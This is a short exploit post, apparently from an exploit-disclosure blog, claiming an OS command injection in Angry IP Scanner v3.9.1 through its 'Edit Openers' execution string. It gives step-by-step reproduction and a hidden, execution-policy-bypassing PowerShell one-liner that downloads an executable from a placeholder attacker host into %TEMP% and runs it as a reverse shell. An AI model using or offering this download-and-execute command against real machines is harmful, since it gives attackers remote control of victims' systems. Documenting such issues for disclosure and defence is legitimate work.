---
layout: post
title: Angry IP Scanner v3.9.1 - OS Command Injection
date: 2023-09-18
category: exploit
---

# Exploit Title: Angry IP Scanner v3.9.1 - OS Command Injection
# Discovered by: Ahmet Ümit BAYRAM
# Discovered Date: 18.09.2023
# Vendor Homepage: https://angryip.org
# Software Link: https://github.com/angryip/ipscan/releases/download/3.9.1/ipscan-3.9.1-setup.exe
# Tested Version: v3.9.1 (latest)
# Tested on: Windows 2019 Server 64bit

### Steps to Reproduce

1. Open Angry IP Scanner.
2. Click on the **Start** button.
3. Go to **Commands > Edit Openers**.
4. Select **Ping** and enter your reverse shell command into the **Execution string** box, then click **OK**.
5. Now go to **Commands > Open > Ping**.
6. Your reverse shell should now be active, connecting to your listener.

### Example of Reverse Shell Command

To set up a reverse shell in the **Execution string** box, you can use the following command:

```batch
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest -Uri http://attacker_ip:port -OutFile %TEMP%\shell.exe; Start-Process %TEMP%\shell.exe"
